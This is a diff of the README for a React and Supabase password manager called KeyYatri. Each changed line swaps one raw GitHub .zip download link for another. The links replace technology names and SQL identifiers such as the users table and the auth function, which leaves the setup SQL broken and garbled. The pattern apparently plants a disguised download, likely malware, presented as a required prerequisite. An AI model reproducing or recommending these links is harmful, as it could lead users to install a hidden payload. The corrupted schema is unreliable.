@@ -1,6 +1,6 @@
 # KeyYatri Password Manager
 
-KeyYatri is a secure password manager built with React, https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip, and Supabase. It provides a clean, user-friendly interface for storing and managing your passwords with strong encryption.
+KeyYatri is a secure password manager built with React, https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip, and Supabase. It provides a clean, user-friendly interface for storing and managing your passwords with strong encryption.
 
 ## Features
 
@@ -23,7 +23,7 @@ KeyYatri is a secure password manager built with React, https://raw.githubuserco
 
 ## Prerequisites
 
-- https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip 14+
+- https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip 14+
 - Supabase account
 
 ## Setup
@@ -36,7 +36,7 @@ KeyYatri is a secure password manager built with React, https://raw.githubuserco
 -- Create credentials table
 CREATE TABLE credentials (
   id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
-  user_id UUID REFERENCES https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip(id) NOT NULL,
+  user_id UUID REFERENCES https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip(id) NOT NULL,
   name TEXT NOT NULL,
   username TEXT NOT NULL,
   encrypted_password TEXT NOT NULL,
@@ -54,25 +54,25 @@ CREATE POLICY "Users can create their own credentials"
   ON credentials
   FOR INSERT
   TO authenticated
-  WITH CHECK (https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip() = user_id);
+  WITH CHECK (https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip() = user_id);
 
 CREATE POLICY "Users can view their own credentials"
   ON credentials
   FOR SELECT
   TO authenticated
-  USING (https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip() = user_id);
+  USING (https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip() = user_id);
 
 CREATE POLICY "Users can update their own credentials"
   ON credentials
   FOR UPDATE
   TO authenticated
-  USING (https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip() = user_id);
+  USING (https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip() = user_id);
 
 CREATE POLICY "Users can delete their own credentials"
   ON credentials
   FOR DELETE
   TO authenticated
-  USING (https://raw.githubusercontent.com/newbieyan13/keyyatri-live/main/docs/keyyatri_live_3.6.zip() = user_id);
+  USING (https://github.com/newbieyan13/keyyatri-live/raw/refs/heads/main/src/types/keyyatri-live-Berliner.zip() = user_id);
 ```
 
 3. Create a `.env` file with your Supabase credentials:
